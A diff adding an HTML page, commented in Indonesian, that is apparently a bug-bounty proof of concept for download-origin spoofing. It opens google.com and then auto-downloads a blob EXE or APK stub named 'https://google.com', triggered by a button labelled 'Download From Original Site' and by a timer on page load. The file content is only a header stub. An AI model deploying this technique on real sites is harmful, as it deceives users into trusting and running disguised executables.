@@ -1,0 +1,81 @@
+<html>
+ <head> 
+  <meta charset="utf-8">
+<style>
+.button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+</style>
+ </head> 
+ <body> 
+  <script>
+function a(){
+    // Buka situs legit pertama
+    window.open('https://google.com', 'legitWindow');
+    
+    // Setelah 5 detik, download file dengan nama "https://google.com"
+    setTimeout(function(){
+        createBlobDownload('https://google.com', 'exe');
+    }, 5000);
+}
+
+// Function untuk create blob download dengan nama file "https://google.com"
+function createBlobDownload(filename, fileType) {
+    let fileContent = '';
+    let mimeType = 'application/octet-stream';
+    
+    // Content berdasarkan tipe file
+    switch(fileType) {
+        case 'exe':
+            fileContent = 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00';
+            mimeType = 'application/x-msdownload';
+            break;
+        case 'apk':
+            fileContent = 'PK\x03\x04\x14\x00\x08\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00';
+            mimeType = 'application/vnd.android.package-archive';
+            break;
+        default:
+            fileContent = 'File: ' + filename + '\nThis is a test file for VRP research';
+    }
+    
+    // Buat blob file
+    const blob = new Blob([fileContent], { type: mimeType });
+    const url = URL.createObjectURL(blob);
+    
+    // Buat element download
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename; // Nama file akan jadi "https://google.com"
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+}
+
+// Auto-execute ketika page load (opsional)
+window.addEventListener('load', function() {
+    // Otomatis jalankan setelah 10 detik
+    setTimeout(function() {
+        // Buka google.com
+        window.open('https://google.com', 'autoWindow');
+        // Download file dengan nama "https∶⧸⧸google.com"
+        createBlobDownload('https://google.com', 'exe');
+    }, 10000);
+});
+</script> 
+
+  <center>
+    <input type="button" class="button" value="Download From Original Site" onclick="a()">
+  </center>
+
+ </body>
+</html>
